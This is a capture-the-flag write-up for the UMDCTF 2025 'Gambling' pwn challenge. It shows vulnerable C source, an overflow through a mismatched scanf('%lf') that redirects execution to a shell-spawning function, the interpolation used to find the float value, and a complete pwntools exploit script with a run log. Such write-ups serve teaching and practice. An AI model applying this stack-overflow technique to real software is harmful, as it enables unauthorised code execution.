---
title: "Gambling 🎲 – Stack Overflow Exploit via Floats (UMDCTF 2025)"
tags: [CTF, binary exploitation, float overflow, pwn]
---

# UMDCTF 2025 - Gambling Pwn Challenge Writeup 🎲

![CTF](https://img.shields.io/badge/CTF-UMDCTF_2025-blue)
![Challenge](https://img.shields.io/badge/Challenge-Gambling-informational)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)

## Table of Contents 📚
- [Challenge Overview](#challenge-overview-) 📄
- [Source Code Analysis](#source-code-analysis-) 🔍
- [Exploitation Plan](#exploitation-plan-) 🛠️
- [Final Exploit Payload](#final-exploit-payload-) 🎯
- [Exploit Script](#exploit-script-) 🧠
- [Result](#result-) 🏆
- [Final Notes](#final-notes-) ✨

## Challenge Overview 📄

- **Binary:** gambling (i386 ELF)

**Protections:**
```
RELRO: Partial
Stack Canary: None
NX: Enabled
PIE: No
FORTIFY: Enabled
Stripped: No
```

## Source Code Analysis 🔍

```c
float rand_float() {
  return (float)rand() / RAND_MAX;
}

void print_money() {
    system("/bin/sh");
}

void gamble() {
    float f[4];
    float target = rand_float();
    printf("Enter your lucky numbers: ");
    scanf(" %lf %lf %lf %lf %lf %lf %lf", f, f+1, f+2, f+3, f+4, f+5, f+6);
    if (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) {
        printf("You win!\n");
    } else {
        printf("Aww dang it!\n");
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    srand(420);
    while (1) {
        gamble();
        getc(stdin);
        printf("Try again? ");
        char buf[20];
        fgets(buf, 20, stdin);
        if (strcmp(buf, "no.\n") == 0) {
            break;
        }
    }
}
```

## Exploitation Plan 🛠️

Since PIE is disabled (addresses are fixed) and there's no canary, the strategy is straightforward:

1. **Overflow the stack** until we control EIP.
2. **Overwrite EIP** with the address of `print_money()`.
3. **Trigger the shell**.

However, the overflow happens through `scanf("%lf")`, meaning we must carefully craft our input as **doubles (floating-point numbers)**.

Directly writing a pointer as a float is tricky because floating-point encoding is complicated (IEEE-754 standard).

### First Attempts: Rough Bruteforce

Due to the non-linear and complex behavior of IEEE-754 encoding combined with ASCII parsing via scanf, deriving the exact floating-point representation mathematically was impractical.

A local empirical interpolation was the fastest and most efficient approach.

Initial experiments showed:

- Sending larger float numbers would make EIP land somewhere around `0x8049400`.
- Decreasing the float values would move EIP upwards.

It was observed that:

| Input Float | Resulting EIP |
|:---|:---|
| `0.000...004869` | `0x8049400` |
| `0.000...00487`  | `0x8049515` |

Thus, the correct value to land on `0x80492c0` (address of `print_money`) was **between** those two inputs.

A direct binary crafting of a floating-point value containing the desired address would have been theoretically possible, but extremely impractical due to the complexity of IEEE-754 encoding and memory layout uncertainties.

### Precise Calculation

Instead of bruteforcing, I decided to calculate it properly.

Given:

```python
float1 = float('0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004869')
float2 = float('0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000487')

eip1 = 0x8049400
eip2 = 0x8049515
eip_target = 0x80492c0
```

We calculate:

```python
delta_eip = eip2 - eip1
delta_float = float2 - float1

ratio = delta_float / delta_eip

offset_eip = eip_target - eip1
offset_float = offset_eip * ratio

float_target = float1 + offset_float

print(f"[+] Exact float needed to reach 0x80492c0 : {float_target:.400f}")
```

Thus, we derive the precise float we need.

## Final Exploit Payload 🎯

The final value to send as the 7th number was:

```plaintext
0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048678447653429606926762156265085299415604106647379534502196788585758286387045593904549590297537598720611109479754048472644682294918
```

Thus, the final payload looked like:

```plaintext
0 0 0 0 0 0 0.00000...(above float)
```

## Exploit Script 🧠

```python
from pwn import *
import struct
import argparse

context.binary = './gambling'
context.arch = 'i386'
context.log_level = 'warn'

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, help='Remote host')
parser.add_argument('--port', type=int, help='Remote port')
args = parser.parse_args()

# Exact float string to send
exact_float_str = "0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048678447653429606926762156265085299415604106647379534502196788585758286387045593904549590297537598720611109479754048472644682294918"

print("[+] Starting exploit...")

def start_process():
    if args.host and args.port:
        return remote(args.host, args.port)
    else:
        return process('./gambling')

if __name__ == "__main__":
    p = start_process()
    p.recvuntil(b'Enter your lucky numbers: ')

    # Build the payload with the exact float string as the 7th number
    payload = "0 0 0 0 0 0 " + exact_float_str
    print(f"[+] Sending payload: {payload}")
    p.sendline(payload.encode())

    p.sendline(b'id')
    print(p.recvline())
    result = p.recvline()
    if b'uid' in result:
        print("SUCCESS")
        print(result)
    p.close()
```

## Result 🏆

```bash
└──╼ $python3 exp.py --host challs.umdctf.io --port 31005
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    FORTIFY:    Enabled
    Stripped:   No
[+] Starting exploit...
[+] Sending payload: 0 0 0 0 0 0 0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048678447653429606926762156265085299415604106647379534502196788585758286387045593904549590297537598720611109479754048472644682294918
b'Aww dang it!\n'
b'UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}\n'
```

## Final Notes ✨

- Classic stack overflow by mismatch between buffer type and scanf format.
- Critical to master floating point to memory corruption tricks in CTF pwn tasks.

🔙 [Back to UMDCTF 2025 Writeups](../../)
